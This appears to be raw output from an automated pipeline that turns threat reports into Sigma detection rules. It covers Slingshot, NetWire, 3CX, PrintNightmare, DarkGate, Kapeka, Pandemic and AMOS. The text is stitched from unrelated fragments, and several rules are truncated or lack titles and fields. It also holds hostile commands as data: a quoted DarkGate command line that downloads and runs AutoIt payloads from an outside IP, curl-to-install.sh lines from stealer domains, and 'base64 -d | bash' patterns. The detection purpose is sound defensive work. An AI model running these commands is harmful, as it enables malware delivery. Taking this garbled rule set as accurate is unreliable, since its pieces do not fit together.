status: experimental

title: Initial Access via Mikrotik Router Compromise with Winbox Loader

status: experimental
description: Detects the initial access phase of Slingshot APT where attackers compromise Mikrotik routers and use Winbox Loader to place a malicious ipv4.dll file on the router's filesystem.
references:
    - https://securelist.com/apt-slingshot/84312/
    - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf
    - https://github.com/Neo23x0/signature-base/blob/master/yara/apt_slingshot.yar
    - https://www.kaspersky.com/blog/web-sas-2018-apt-announcement-2/21514/

author: Sigma Assistant
date: 2026-10-17

- The attack uses a specific registry callback mechanism to communicate between user-mode and kernel-mode components by monitoring registry operations. Strings: `CmRegisterCallback`, `ArbitraryUserPointerfieldoftheTIBpointer`, `0x2BADDOOD`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack employs a specific kernel-mode driver exploitation technique using vulnerable drivers to gain kernel privileges. Strings: `Goad.sys`, `SpeedFan.sys`, `Sandra.sys`, `ElbyCDIO.sys`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack uses a specific network sniffer that hides traffic by checking for Slingshot-related packets in network buffer lists. Strings: `NdisMSendNetBufferListsComplete`, `NdisMIndicateReceiveNetBufferLists`, `0xDEADFOOD`, `0xDADAE000`, `0x212`, `0xE17F`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack uses a specific packer that transforms custom PE samples into base-independent code for easier process injection. Strings: `0x400byteslong`, `Unpackerstub`, `Dataforunpacking`, `0x198`, `sectionRVA`, `characteristics`, `realsize`, `packedsize`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)

(source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack uses specific file paths and names for its malicious components, including a DLL named chmhlpr.dll. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack uses specific Windows services and processes for persistence and execution. Strings: `svchost.exe`, `services.exe`, `smss.exe`, `csrss.exe`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)
- The attack uses specific network ports for communication with command and control servers. Strings: `2869`, `1900`, `5431`. (source: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/09133534/The-Slingshot-APT_report_ENG_final.pdf)

attack_vector.reasoning: The text clearly describes a phishing email with a hyperlink that leads to the download of a malicious file. The attack chain is well-defined from initial access through execution and persistence. While some post-exploitation behavior is described, the primary attack vector is clearly defined as user interaction with a phishing email.

pipeline.attack_summary: An attacker sends phishing emails containing links to download a 7z archive with a NetWire RAT variant. The malware uses anti-analysis techniques like dynamic code extraction and sandbox detection, then installs itself via RunOnce registry key, creates persistence by relocating its executable to AppData\Install, collects system information including credentials, and communicates with a C2 server at gbam0001.duckdns.org:3366 using command 9B.

indicators.context: The downloaded file is a 7z file, which contains the new variant of NetWire RAT. After decompressing it, we are able to get an EXE file with the name of "PROFORMA-INVOICE 0990.exe".
The downloaded file is a 7z file, which contains the new variant of NetWire RAT.
Its domain is found in the decrypted string, which for this variant is "gbam0001.duckdns[.]org:3366".
NetWire continues to create its home key (HKCU\SOFTWARE\NetWire) as well as adding it into the auto-run group in the victim's registry.
It checks to see if the current executable file is located in the correct folder (%AppData%\Install) and has the right file name (Host.exe).
NetWire creates a log folder to store the log files of information that it collects from the victim's system. The log folder is located at "%AppData%\Logs".

It checks to see if the current executable file is located in the correct folder (%AppData%\Install) and has the right file name (Host.exe). If not, it relocates the file into "%AppData%\Install" and renames it as "Host.exe".
Figure 5 is the screenshot of the process tree. You can see the process where NetWire was relocated to "C:\Users\user_name\AppData\Roaming\Install\Host.exe".
Once the connection with its server is established, NetWire starts waiting for the C&C server to reply with a "9B" command packet
Sample SHA256 [PROFORMA-INVOICE 0990.exe]C9EC52AE2DDB993E2DA0EFD4FBAB0BFECDC7CC6DA16E446AC9C92E7981733E6E
Sample SHA256 [PROFORMA-INVOICE 0990.7z]56BB4AAC4E52FD5D71824782D1DBE05D4209045C1E5DD80936690E81652183B8
Figure 3 shows that it calls the API USER32.GetCursorPos() twice to obtain two mouse cursor positions and then compares them.
It also calls the API ntdll.ZwGetContextThread to obtain the current thread context structure, which contains the CPU debug register status.
call dword ptr [ebp+110] ;kernel32.GetCurrentThread
Next, it initializes several global variables and Windows Sockets by calling the API WSAStartup().
It then calls the _beginthreadex() function to start a thread, the thread function of which registers a window class, whose window procedure function is a keylogger.
Current login User name collected by calling the API GetUserNameA() or from the system environment variable.
Victim's Computer name by calling the API GetComputerNameA().
Victim's Windows version information by calling the API GetVersionExA().

Other than that, each time it calls several key API functions, it first checks to see if the API had a soft breakpoint set by a debugger. ... mov eax, dword ptr [edi+4000] cmp dword ptr [eax+4], 0 ;Dr0 jnz short 00391EA5 ... call eax ;call the API like kernel32.CreateProcessInternalW

GuLoader is now widely used for RAT distribution in 2020 and we continue to see the same type of email lures for malspam pushing NetWIre RAT. ... The GuLoader EXE is persistent through the Windows Registry under the following key: HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
As you can see, the malware file download link is: "hxxps[:]//www[.]mediafire[.]com/file/d86hz5qj21lmhrb/PROFORMA-INVOICE_0990.7z/file".
The attack injects malicious code into the ieinstall process to execute the NetWire RAT payload.

pipeline.attack_summary: The SmoothOperator campaign compromises the 3CX Desktop App software supply chain by distributing trojanized installers that execute shellcode from heap space. The malware uses a multi-stage approach, downloading ICO files from GitHub containing base64-encoded payloads, which are then decoded to retrieve C2 URLs. It employs various obfuscation techniques including custom data encoding and XOR encryption with key 0x7A. On macOS, the trojan is delivered via a malicious libffmpeg.dylib file that gathers environmental information and retrieves a second-stage payload named UpdateAgent.

--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The malware uses a custom data encoding algorithm to obfuscate data exfiltrated over the C2 channel, making network traffic appear legitimate. Strings: `custom data encoding algorithm`, `obfuscate data exfiltrated over the C2 channel`, `custom data obfuscation`, `data encoding`, `encoding involves two distinct steps`, `validCharList`, `single-byte XOR key, 0x7A`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware implements a file lock to ensure only one instance runs at a time by checking for a .session-lock file. Strings: `.session-lock`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware generates a 36-character victim ID in UUID format and writes it to a .main_storage file for persistence. Strings: `victim ID`, `UUID format`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware uses a hardcoded list of 15 C2 servers plus the 3CX website URL, selected randomly for each beacon. Strings: `embedded list of 15 C2s`, `15 C2s`, `3CX website URL`, `randomly chooses a new server from the list`, `C2 URLs`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware sleeps for between 7 and 20 days before beaconing on first execution, then uses time-seeded random algorithm for beacon intervals. Strings: `sleeps for between 7 and 20 days`, `time-seeded random algorithm`, `beacon interval`, `sleep cycle generation`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware uses specific command and control tasking commands with IDs 0x3849, 0x8001, and 0x9001 for payload execution, sleep, and exit. Strings: `Command ID 0x3849 (8I)`, `0x8001`, `0x9001`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware downloads and executes payloads from the C2 server using popen function with command line execution. Strings: `popen`, `command line`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware uses specific file paths for its persistence and data handling including Application Support directories. Strings: `$HOME/Library/Application Support/3CX Desktop App/`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware uses specific HTTP headers in its beacon requests including 3cx_auth_id and 3cx_auth_token_content fields. Strings: `3cx_auth_id=%s;3cx_auth_token_content=%s;__tutma=true`, `Cookie field`, `3cx_auth_id`, `3cx_auth_token_content`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The malware uses specific encoding patterns for its beacon data including HTML-style character replacements. Strings: `&dol>`, `&per>`, `&plus>`, `&semi>`. (source: https://www.ncsc.gov.uk/sites/default/files/documents/NCSC_MAR-Smooth-Operator.pdf)
- The Windows variant of the malware uses RC4 decryption with a hardcoded key '3jB(2bsG#@c7' to decrypt embedded payloads. Strings: `3jB(2bsG#@c7`. (source: https://guardsix.com/blog/trojanized-3cx-desktop-applications)
- The malware uses a specific process name '3CXDesktopApp.exe' in its attack chain. Strings: `3CXDesktopApp.exe`. (source: https://guardsix.com/blog/trojanized-3cx-desktop-applications)
- The trojanized application loads malicious DLLs using DLL side-loading technique with ffmpeg.dll and d3dcompiler_47.dll. Strings: `ffmpeg.dll`, `d3dcompiler_47.dll`. (source: https://guardsix.com/blog/trojanized-3cx-desktop-applications)
- The malware uses a specific process name 'guard64.dll' in its attack chain. Strings: `guard64.dll`. (source: https://guardsix.com/blog/trojanized-3cx-desktop-applications)
- The attack uses a Yara rule to detect malicious DLLs in the 3CXDesktopApp by looking for specific binary patterns and markers. Strings: `rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_1`, `rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_2`, `rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_3`, `rule SUSP_APT_MAL_NK_3CX_Malicious_Samples_Mar23_1`, `rule APT_SUSP_NK_3CX_RC4_Key_Mar23_1`, `rule SUSP_3CX_App_Signed_Binary_Mar23_1`, `rule SUSP_3CX_MSI_Signed_Binary_Mar23_1`, `rule APT_MAL_macOS_NK_3CX_Malicious_Samples_Mar23_1`, `rule APT_MAL_MacOS_NK_3CX_DYLIB_Mar23_1`, `rule APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1`, `rule APT_MAL_NK_3CX_Malicious_Samples_Mar23_4`, `rule MAL_3CXDesktopApp_MacOS_Backdoor_Mar23`. (source: https://docs.velociraptor.app/exchange/artifacts/pages/smoothoperator/)
- The attack employs specific file paths and directory structures to establish persistence and execute malicious code on Windows systems. Strings: `C:\Users\*\AppData\*\Programs\3CXDesktopApp\**.{dll,exe}`. (source: https://docs.velociraptor.app/exchange/artifacts/pages/smoothoperator/)

rules_yaml:
title: Registry Modification for CVE-2021-1675 Exploitation
id: 2ff912e8-159f-4789-a2ef-761292b32a24
status: experimental
description: Detects registry modifications to PointAndPrint settings and null session configurations that are indicative of CVE-2021-1675 exploitation attempts.
references:
    - https://github.com/cube0x0/CVE-2021-1675
    - https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md
    - https://github.com/LaresLLC/CVE-2021-1675
    - https://github.com/corelight/CVE-2021-1675
    - https://github.com/cube0x0/CVE-2021-1675/blob/main/SharpPrintNightmare/CVE-2021-1675.py
    - https://attack.mitre.org/techniques/T1078/002/
    - https://attack.mitre.org/techniques/T1547/012/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.privilege-escalation
    - attack.t1078.002
    - attack.t1547.012
logsource:
    category: registry_set
    product: windows
detection:
    selection:
        TargetObject|contains:
            - 'HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint'
            - 'HKLM\System\CurrentControlSet\Services\LanManServer\Parameters'
        Details|contains:
            - 'RestrictDriverInstallationToAdministrators'
            - 'NoWarningNoElevationOnInstall'
            - 'NullSessionPipes'
            - 'NullSessionShares'
            - 'EveryoneIncludesAnonymous'
            - 'RestrictAnonymous'
    condition: selection
falsepositives:
    - Legitimate administrative configuration changes to print settings or SMB null sessions
level: high

id: 2ff912e8-159f-4789-a2ef-761292b32a25
status: experimental
description: Detects execution of the CVE-2021-1675 exploit script via command line arguments, indicating an attempt to exploit the vulnerability.
references:
    - https://github.com/cube0x0/CVE-2021-1675
    - https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md
    - https://github.com/LaresLLC/CVE-2021-1675
    - https://github.com/corelight/CVE-2021-1675
    - https://github.com/cube0x0/CVE-2021-1675/blob/main/SharpPrintNightmare/CVE-2021-1675.py
    - https://attack.mitre.org/techniques/T1059/003/
    - https://attack.mitre.org/techniques/T1059/001/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1059.003
    - attack.t1059.001
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'CVE-2021-1675.py'
            - 'PrintNightmare'
        Image|endswith:
            - '\python.exe'
            - '\python3.exe'
    condition: selection
falsepositives:
    - Legitimate use of Python scripts for system administration or development
level: high

title: DCE/RPC Function Call for CVE-2021-1675 Exploitation
id: 2ff912e8-159f-4789-a2ef-761292b32a26
status: experimental
description: Detects the use of RpcAddPrinterDriverEx DCE/RPC function calls, which are used in CVE-2021-1675 exploitation to add printer drivers.
references:
    - https://github.com/cube0x0/CVE-2021-1675
    - https://github.com/cube0x0/CVE-2021-1675/blob/main/README.md
    - https://github.com/LaresLLC/CVE-2021-1675

    - https://attack.mitre.org/techniques/T1055/
author: Sigma Assistant
date: 2026-10-17
tags:

    - attack.execution
logsource:
    category: other
    product: windows
detection:
    selection:
        EventID: 4688
        CommandLine|contains: 'RpcAddPrinterDriverEx'
    condition: selection
falsepositives:
    - Legitimate use of RPC functions for printer management
level: high

attack_vector.initial_access_vector: Attacker establishes SMB NULL session against target system to exploit PointAndPrint vulnerability and execute malicious DLL via RpcAddPrinterDriverEx function calls
attack_vector.entry_point: SMB NULL session on target system
attack_vector.attacker_controlled_input: target IP address, share path to malicious DLL

payload_signatures.derived_from: execution of CVE-2021-1675 exploit script
malicious DLL path specified in exploit command line
specific DCE/RPC commands used to exploit vulnerability
registry modification to disable spooler service as mitigation technique

incidental_artifacts.reason: researcher's workflow to manage dependencies, not attacker activity
researcher's workflow to obtain framework source code, not attacker behavior
researcher's workflow to install framework from source, not attacker activity
researcher's tool used for scanning potential vulnerable hosts, not part of attack execution

attack_vector.reasoning: The write-up clearly describes the initial attack vector using SMB NULL sessions to exploit PointAndPrint functionality, with specific commands and registry modifications shown in the PoC code. The exploit uses RpcAddPrinterDriverEx function calls which are directly tied to the vulnerability.

pipeline.attack_summary: The attack exploits CVE-2021-1675 by establishing an SMB NULL session to target systems, modifying PointAndPrint registry settings to allow unrestricted driver installation, and using RpcAddPrinterDriverEx function calls to execute malicious DLLs via the print spooler service. It leverages null sessions and modified registry keys to bypass authentication restrictions.

description: Detects the initial access phase of CVE-2021-38647 exploitation where an attacker sends an unauthenticated HTTP POST request to the OMI /wsman/ endpoint using WS-Management protocol with SOAP/XML payload containing ExecuteShellCommand action, which allows remote code execution as root without authentication.
references:

date: 2026-10-17

    - attack.t1606

--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The malware uses specific registry keys to disable Remote Desktop anti-aliasing and suppress Windows Error Reporting UI prompts as part of its evasion techniques. Strings: `*\Terminal Services\DisableRemoteDesktopAntiAlias`, `*\SOFTWARE\Microsoft\Windows\Windows Error Reporting\DontShowUI`. (source: https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html?web_view=true)
- The malware employs cmdkey.exe to create stored credentials for accessing Windows OS resources, which is a technique used for privilege escalation and credential access. Strings: `cmdkey.exe`. (source: https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html?web_view=true)
- The malware uses PowerShell commands to download AutoIt3.exe from a remote server and execute an AutoIt script that displays a message box, demonstrating its ability to execute scripts via PowerShell. Strings: `iwr 'https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3.zip'`, `autoit3.exe`. (source: https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html?web_view=true)
- The malware uses specific process names like wndbg.exe and dbgeng.dll for DLL side-loading to execute malicious code. Strings: `wndbg.exe`, `dbgeng.dll`. (source: https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html?web_view=true)
- The malware utilizes PSEXEC for privilege escalation and potential lateral movement within compromised networks. Strings: `psexec`. (source: https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html?web_view=true)
- The malware uses specific file paths to drop and execute AutoIt scripts in a temporary directory. Strings: `c:\tmpa\Autoit3.exe`, `c:\tmpa\script.au3`. (source: https://www.splunk.com/en_us/blog/security/enter-the-gates-an-analysis-of-the-darkgate-autoit-loader.html?web_view=true)
- The attack employs specific file paths and names for temporary files and executables during execution. Strings: `c:\temp\d.txt`, `c:\temp\t.txt`, `c:\temp\p.txt`, `c:\temp\crash.txt`, `c:\temp\tskm`, `c:\temp\PsExec.exe`, `c:\temp\Autoit3.exe`. (source: https://github.com/executemalware/Malware-IOCs/blob/main/2023-07-24%20DarkGate%20IOCs)
- The attack uses specific command-line arguments and parameters for privilege escalation and system elevation. Strings: `-accepteula -d -u`, `/c c:\temp\PsExec.exe -accepteula -i -d -s`, `I need Admin rights to elevate to SYSTEM`, `Already Elevated to SYSTEM`. (source: https://github.com/executemalware/Malware-IOCs/blob/main/2023-07-24%20DarkGate%20IOCs)
- The attack communicates with C2 servers using specific HTTP request paths and headers. Strings: `/wzx/`, `/no_halt_7891.msi`, `http://80.66.88.145:7891/`. (source: https://github.com/executemalware/Malware-IOCs/blob/main/2023-07-24%20DarkGate%20IOCs)
- The attack uses specific PowerShell or AutoIt script execution techniques with encoded commands. Strings: `yPVtlbayxek = Replace("Shell.Application","","")`, `yPVtlbayxeks = Replace("cmd","","")`, `yPVtlbayxekss = Replace("/c mkdir c:\hitp & cd /d c:\hitp & copy c:\windows\system32\curl.exe hitp.exe & hitp -o Autoit3.exe http://80.66.88.145:2351 & hitp -o aFbxxz.au3 http://80.66.88.145:2351/msiorbxthbp & Autoit3.exe aFbxxz.au3","","")`. pipeline.attack_summary: Kapeka is a novel backdoor used in targeted attacks against victims in Eastern Europe since mid-2022, likely by the Sandworm APT group. It uses a dropper named 'crdss.exe' to install itself on victim machines, then establishes persistence via scheduled tasks and registry keys, communicates with C2 servers using HTTP/JSON, and employs various obfuscation techniques including hardcoded values and mutex names.

--- Web search: what other pages add about this attack (from the web, not from the report; each string was found in its page) ---
- The backdoor creates a scheduled task named 'Sens Api' for persistence mechanisms. Strings: `Sens Api`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a registry key 'HKU\<SID>\Software\Microsoft\Cryptography\Providers\<GUID>\' to persist its configuration under the value name 'Seed'. Strings: `HKU\ \Software\Microsoft\Cryptography\Providers\ \`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a hardcoded GUID value when GetCurrentHwProfileW() fails. Strings: `0CA1BE92-FB73-BB74-5E41-00FDE76B2E8D`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a mutex name pattern 'Global\BFE_Notify_Event_' followed by a generated GUID. Strings: `Global\BFE_Notify_Event_ `. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor drops files in the Microsoft folder under either CSIDL_COMMON_APPDATA or CSIDL_LOCAL_APPDATA with a randomly generated 5-6 character name ending in '.wll'. Strings: `Microsoft`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a hardcoded 32-byte key for encryption if registry query fails. Strings: `Azbi3l1xIgcRzTsOHopgrwUdJUMWpOFt`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a custom algorithm to generate a GUID based on CRC32 and PRNG operations applied to the fetched GUID and a hardcoded value. Strings: `LSmL1j`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses WinHttp 5.1 COM interface for network communication. Strings: `winhttpcom . dll`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor launches processes using rundll32 with its first export ordinal (#1) and optional '-d' argument. Strings: `rundll32`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a specific registry path to store its configuration in the 'Seed' value. Strings: `Seed`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a hardcoded fallback mutex GUID if GetCurrentHwProfileW() fails. Strings: `{ad584834 - f1b9 - 1587 - 637b -1e0025582179}`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a hardcoded RSA public key that changes between samples. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor uses a specific file name pattern for dropped files with consonants and vowels followed by '.wll'. Strings: `.wll`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The dropper modifies the file time attributes of the dropped backdoor to match SensApi.dll. Strings: `SensApi .dll`. (source: https://www.withsecure.com/wp-content/uploads/2026/05/WithSecure-Research-Kapeka.pdf)
- The backdoor creates a scheduled task named 'Sens API' to maintain persistence on the system. Strings: `Sens API`. (source: https://cybersecuritynews.com/new-flexible-kapeka-backdoor/)
- The backdoor drops and executes a file named 'crdss.exe' as its dropper. Strings: `crdss.exe`. (source: https://cybersecuritynews.com/new-flexible-kapeka-backdoor/)
- The backdoor creates a registry entry under HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to maintain persistence. Strings: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`. (source: https://cybersecuritynews.com/new-flexible-kapeka-backdoor/)
- The backdoor uses the .wll file extension to masquerade as a Microsoft Word Add-In. Strings: `.wll`. (source: https://cybersecuritynews.com/new-flexible-kapeka-backdoor/)
- The backdoor communicates with C2 servers using HTTP protocol and JSON encoded data structures. Strings: `JSON`. (source: https://cybersecuritynews.com/new-flexible-kapeka-backdoor/)

attack_vector.reasoning: The write-up clearly describes how the attacker delivered an ISO file containing a LNK and DLL, which was executed by a user. The attack vector is entirely local and user-initiated, with no network exploit involved.

pipeline.attack_summary: The attack begins with a user opening an LNK file from an ISO email attachment, which executes rundll32.exe to load a malicious DLL (tamirlan.dll). This initial access allows the threat actor to establish persistence via a local admin account creation and privilege escalation. The malware then uses Meterpreter and Cobalt Strike frameworks for post-exploitation activities including credential dumping (LSASS memory), discovery, lateral movement, and collection of sensitive data.

rules_yaml:
title: Pandemic Implant File Replacement on Shared Drives
id: 50d8a7e4-9b3c-4f2a-9d1e-6c1a7b8d9e0f
status: experimental
description: Detects file access events involving trojaned programs stored on infected shared drives, specifically targeting the Pandemic implant's known file paths and executable names. This rule focuses on initial access and lateral movement stages where attacker-controlled files are accessed or modified.
references:
    - https://wikileaks.org/vault7/
    - https://wikileaks.org/ciav7p1/cms/files/DevelopersGuide.pdf
    - https://our.wikileaks.org/Vault_7:_Grasshopper
    - https://www.bleepingcomputer.com/news/security/vault-7-wikileaks-docs-hint-cia-could-bypass-21-security-products/
    - https://wikileaks.org/vault7/darkmatter/document/ExpressLane-3_1_1-Requirement-Statement/ExpressLane-3_1_1-Requirement-Statement.pdf
    - https://attack.mitre.org/techniques/T1059/003/
    - https://attack.mitre.org/techniques/T1021/002/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.initial-access
    - attack.execution
    - attack.lateral-movement
    - attack.t1059.003
    - attack.t1021.002
logsource:
    category: file_event
    product: windows
detection:
    selection:
        TargetFilename|contains:
            - 'C:\\Program Files\\Cross Match Technologies\\Configurations\\MOBS MiltA\\VerFiles'
            - 'C:\\Program Files\\Cross Match Technologies\\Configurations\\MPBS\\MiltA\\Workspaces'
            - 'C:\\Program Files\\Cross Match Technologies\\Configurations\\Validation Files'
        TargetFilename|endswith:
            - '.exe'
            - '.eft'
            - '.ldf'
            - '.mdf'
    condition: selection
falsepositives:
    - Legitimate administrative file access in the specified directories
    - Authorized software updates or deployments to these paths
level: high

title: Execution of Pandemic Trojaned Programs from Shared File Server
id: cfd920be-9b76-469e-a42c-e62fd4929789
status: experimental
description: Detects execution of trojaned programs stored on the infected shared file server, specifically targeting executables with names like MOBS_Upgrade.exe and files with extensions such as .eft, .ldf, and .mdf. This rule targets the execution stage where users run compromised programs from the shared drive.
references:
    - https://wikileaks.org/vault7/
    - https://wikileaks.org/ciav7p1/cms/files/DevelopersGuide.pdf
    - https://our.wikileaks.org/Vault_7:_Grasshopper
    - https://www.bleepingcomputer.com/news/security/vault-7-wikileaks-docs-hint-cia-could-bypass-21-security-products/
    - https://wikileaks.org/vault7/darkmatter/document/ExpressLane-3_1_1-Requirement-Statement/ExpressLane-3_1_1-Requirement-Statement.pdf
    - https://attack.mitre.org/techniques/T1059/003/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1059.003
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith:
            - '\MOBS_Upgrade.exe'
            - '\*.eft'
            - '\*.ldf'
            - '\*.mdf'
        CommandLine|contains:
            - 'C:\\Program Files\\Cross Match Technologies\\Configurations\\MOBS MiltA\\VerFiles'
            - 'C:\\Program Files\\Cross Match Technologies\\Configurations\\MPBS\\MiltA\\Workspaces'
            - 'C:\\Program Files\\Cross Match Technologies\\Configurations\\Validation Files'
    condition: selection
falsepositives:
    - Legitimate software installations or updates in the specified directories
    - Authorized deployments of legitimate applications using these naming conventions
level: high

title: Pandemic Implant Persistence via Scheduled Tasks or Services

Attackers deploy a custom backdoor (Tavdig/Wipbot/WorldCupSec) that communicates via HTTP C&C channels, later upgrading victims to more sophisticated Carbon/Cobra systems. Watering hole attacks using Java exploits (CVE-2012-1723) and fake Flash/Security apps are also used.

attack_vector.reasoning: The write-up clearly describes a phishing vector via WhatsApp with single-use URLs leading to browser exploits. The exploit chain involves privilege escalation vulnerabilities (CVE-2021-31979 and CVE-2021-33771) that allow for kernel code execution, followed by DLL hijacking and COM persistence techniques. The attack is well-documented from initial access through post-exploitation.

pipeline.attack_summary: The attack begins with a user opening a malicious link sent via WhatsApp, triggering a browser exploit that delivers the DevilsTongue malware. The malware uses COM hijacking for persistence by modifying registry keys to load a malicious DLL from the Windows IME folder. It drops encrypted configuration files in system32\config and installs a legitimate signed driver (physmem.sys) to enable kernel-level operations. The malware employs evasion techniques to ensure legitimate DLLs are still loaded while maintaining persistence.

rules_yaml:
title: MacOS Terminal Command Injection via Base64 Decoding and Bash Execution
id: 5e8f0c9a-7d2b-4c3e-8a1f-9b4e6d7a8f9c
status: experimental
description: Detects suspicious command-line execution in macOS Terminal that uses base64 decoding followed by bash execution, a common pattern used to obfuscate and execute malicious payloads.
references:
    - https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
    - https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing
    - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml
    - https://attack.mitre.org/techniques/T1204/004/
    - https://attack.mitre.org/techniques/T1027/010/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1204.004
    - attack.t1027.010
logsource:
    category: process_creation
    product: macos
detection:
    selection_cli:
        CommandLine|contains:
            - 'base64 -d | bash'
            - 'base64 -D | sh'
    condition: selection_cli
falsepositives:
    - Legitimate scripts using base64 decoding and execution for legitimate purposes
level: high

title: MacOS Malicious Install Script Execution via Curl Download
id: a1b2c3d4-e5f6-7890-a1b2-c3d4e5f67890
status: experimental
description: Detects execution of install.sh scripts downloaded from known malicious domains using curl, which is part of the AMOS stealer campaign.
references:
    - https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
    - https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing
    - https://github.com/bobby-tablez/TTP-Threat-Feeds/blob/45398914e631f8372c3a9fbcd339ff65ffff1b17/results/2025/10/20251001-161956-trendmicro-atomic-macos-stealer-(amos).yml
    - https://attack.mitre.org/techniques/T1204/004/
    - https://attack.mitre.org/techniques/T1059/002/
author: Sigma Assistant
date: 2026-10-17
tags:
    - attack.execution
    - attack.t1204.004
    - attack.t1059.002
logsource:
    category: process_creation
    product: macos
detection:
    selection_cli:
        CommandLine|contains:
            - 'curl -fsSL hxxps://goatramz[.]com/get4/install.sh'
            - 'curl -fsSL hxxps://letrucvert[.]com/get8/install.sh'
    condition: selection_cli
falsepositives:
    - Legitimate software using curl to download scripts from known domains
level: high

title: MacOS Persistence via LaunchDaemon Configuration File Creation
id: f0e9d8c7-b6a5-4321-f0e9-d8c7b6a54321
status: experimental
description: Detects creation of a LaunchDaemon configuration file used for maintaining persistence in macOS systems, specifically targeting the AMOS stealer campaign.
references:
    - https://www.trendmicro.com/en_us/research/25/i/an-mdr-analysis-of-the-amos-stealer-campaign.html
    - https://hunt.io/blog/macos-clickfix-applescript-terminal-phishing
